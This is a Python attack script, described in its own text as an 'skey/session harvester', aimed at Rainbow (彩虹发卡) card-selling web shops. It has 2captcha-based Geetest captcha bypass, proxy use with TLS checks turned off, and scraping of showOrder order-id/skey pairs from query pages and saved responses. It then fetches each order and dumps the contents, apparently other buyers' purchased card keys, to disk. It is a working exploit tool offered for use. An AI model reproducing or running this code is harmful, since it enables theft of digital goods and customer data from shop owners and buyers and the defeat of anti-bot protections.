#!/usr/bin/env python3
"""彩虹发卡 skey 会话工具：登录/查单/showOrder 拖卡。"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"

sys.path.insert(0, str(Path(__file__).resolve().parent))
from geetest_2captcha import solve_geetest_v3  # noqa: E402


class RainbowSession:
    def __init__(self, host: str, base_path: str, proxy: str, cookie_file: str | None = None):
        self.host = host
        self.base = f"https://{host}{base_path}"
        self.base_path = base_path if base_path.endswith("/") else base_path + "/"
        self.s = requests.Session()
        self.s.verify = False
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.s.headers.update({"User-Agent": UA, "Referer": self.base})
        self.csrf = ""
        if cookie_file:
            self._load_cookies(cookie_file)

    def _ajax_url(self, act: str) -> str:
        return self.base + f"ajax.php?act={act}"

    def _user_ajax_url(self, act: str) -> str:
        return f"https://{self.host}{self.base_path}user/ajax.php?act={act}"

    def _login_page_url(self) -> str:
        return f"https://{self.host}{self.base_path}user/login.php"

    def _load_cookies(self, path: str) -> None:
        for line in Path(path).read_text().splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "\t" in line:
                parts = line.split("\t")
                if len(parts) >= 7:
                    self.s.cookies.set(parts[5], parts[6], domain=parts[0].lstrip("."))
            elif "=" in line:
                k, v = line.split("=", 1)
                self.s.cookies.set(k.strip(), v.strip(), domain=self.host)

    def refresh_csrf(self, referer: str | None = None) -> str:
        r = self.s.get(referer or self.base, timeout=25)
        m = re.search(r'csrf_token\s*=\s*"([^"]+)"', r.text)
        self.csrf = m.group(1) if m else ""
        return self.csrf

    def cookies_dict(self) -> dict:
        return dict(self.s.cookies)

    def fetch_geetest_challenge(self) -> dict:
        login_url = self._login_page_url()
        self.refresh_csrf(login_url)
        r = self.s.get(
            self._ajax_url("captcha") + f"&t={int(time.time())}",
            timeout=25,
            headers={"Referer": login_url},
        )
        return r.json()

    def login(self, user: str, password: str, *, use_2captcha: bool = True) -> dict:
        login_url = self._login_page_url()
        self.refresh_csrf(login_url)
        cap = self.fetch_geetest_challenge()
        if cap.get("success") != 1 and cap.get("gt") is None:
            return {"code": -99, "msg": "captcha bootstrap failed", "cap": cap}
        geetest = {}
        if use_2captcha:
            geetest = solve_geetest_v3(
                gt=cap["gt"],
                challenge=cap["challenge"],
                pageurl=login_url,
                api_server=cap.get("api_server"),
            )
        data = {"user": user, "pass": password, "csrf_token": self.csrf, **geetest}
        r = self.s.post(
            self._user_ajax_url("login"),
            data=data,
            timeout=30,
            headers={"Referer": login_url, "X-Requested-With": "XMLHttpRequest"},
        )
        waf = "防火墙" in r.text or r.status_code == 403
        try:
            body = r.json()
        except Exception:
            body = {"raw": r.text[:300], "status": r.status_code, "waf": waf}
        return {
            "code": body.get("code"),
            "msg": body.get("msg"),
            "body": body,
            "cookies": self.cookies_dict(),
            "waf": waf,
            "login_ok": body.get("code") == 0,
        }

    def ajax_query(self, qtype: str, content: str, page: str = "1", *, use_geetest: bool = False) -> dict:
        referer = self.base + "?mod=query"
        self.refresh_csrf(referer)
        data = {"type": qtype, "qq": content, "page": page, "csrf_token": self.csrf}
        if use_geetest:
            cap = self.fetch_geetest_challenge()
            geetest = solve_geetest_v3(
                gt=cap["gt"],
                challenge=cap["challenge"],
                pageurl=referer,
                api_server=cap.get("api_server"),
            )
            data.update(geetest)
        r = self.s.post(
            self._ajax_url("query"),
            data=data,
            timeout=20,
            headers={"Referer": referer, "X-Requested-With": "XMLHttpRequest"},
        )
        try:
            return r.json()
        except Exception:
            return {"code": -99, "msg": "non-json", "raw": r.text[:500], "status": r.status_code}

    def html_query(self, data: str) -> list[tuple[str, str]]:
        r = self.s.get(self.base, params={"mod": "query", "data": data}, timeout=20)
        return re.findall(r"showOrder\((\d+),\s*'([^']+)'\)", r.text)

    def show_order(self, oid: str, skey: str) -> dict:
        r = self.s.post(
            self._ajax_url("order"),
            data={"id": str(oid), "skey": str(skey)},
            timeout=20,
            headers={"Referer": self.base + "?mod=query"},
        )
        try:
            return r.json()
        except Exception:
            return {"code": -99, "raw": r.text[:300]}

    def checklogin(self) -> dict:
        r = self.s.get(self._ajax_url("checklogin"), timeout=15)
        try:
            return r.json()
        except Exception:
            return {"raw": r.text[:200]}


def main() -> int:
    ap = argparse.ArgumentParser(description="彩虹 skey/session harvester")
    ap.add_argument("--host", required=True)
    ap.add_argument("--path", default="/")
    ap.add_argument("--proxy", default="")
    ap.add_argument("--out", default="/data/tools/faka/out/skey_harvest")
    ap.add_argument("--type", default="1")
    ap.add_argument("--contact", default="")
    ap.add_argument("--order-data", default="")
    ap.add_argument("--cookie-file", default="")
    ap.add_argument("--login-user", default="")
    ap.add_argument("--login-pass", default="")
    ap.add_argument("--body-dir", default="", help="扫描目录提取 showOrder 对")
    args = ap.parse_args()

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    sess = RainbowSession(args.host, args.path, args.proxy, args.cookie_file or None)

    report: dict = {
        "host": args.host,
        "base": sess.base,
        "cookies": sess.cookies_dict(),
        "csrf": sess.refresh_csrf(),
        "checklogin": sess.checklogin(),
        "pairs": [],
        "orders": [],
    }

    if args.login_user and args.login_pass:
        report["login"] = sess.login(args.login_user, args.login_pass)
        report["checklogin_after"] = sess.checklogin()

    if args.body_dir:
        from crack_qq_cookie import scan_path

        _, pairs = scan_path(Path(args.body_dir))
        report["pairs"].extend(pairs)

    if args.contact:
        q = sess.ajax_query(args.type, args.contact)
        report["ajax_query"] = q
        if q.get("code") == 0:
            for item in q.get("data", []):
                report["pairs"].append({"id": item.get("id"), "skey": item.get("skey")})

    if args.order_data:
        pairs = sess.html_query(args.order_data)
        report["html_pairs"] = [{"id": a, "skey": b} for a, b in pairs]
        report["pairs"].extend(report["html_pairs"])

    for pair in report["pairs"]:
        oid, sk = pair.get("id"), pair.get("skey")
        if not oid or not sk:
            continue
        od = sess.show_order(str(oid), str(sk))
        rec = {"id": oid, "skey": sk, "order": od}
        report["orders"].append(rec)
        if od.get("code") == 0:
            dump = out / f"order_{oid}.json"
            dump.write_text(json.dumps(od, ensure_ascii=False, indent=2), encoding="utf-8")
            print(f"OK order {oid} -> {dump}")

    report_path = out / "harvest_report.json"
    report_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps({
        "pairs": len(report["pairs"]),
        "orders_ok": sum(1 for o in report["orders"] if o.get("order", {}).get("code") == 0),
        "report": str(report_path),
    }, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
